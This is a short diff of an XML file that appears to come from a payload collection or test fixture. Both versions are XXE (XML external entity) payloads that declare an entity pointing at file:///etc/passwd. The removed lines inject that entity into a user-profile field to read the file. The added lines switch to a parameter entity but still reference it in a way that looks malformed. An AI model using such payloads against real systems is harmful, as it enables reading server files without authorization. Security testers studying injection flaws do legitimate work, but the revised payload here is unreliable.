@@ -1,8 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE updateProfile [
-  <!ENTITY file SYSTEM "file:///etc/passwd">
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
 ]>
-    <updateProfile> 
-        <firstname>Joe</firstname>
-        <lastname>&file;</lastname>
-    </updateProfile>
+&file;
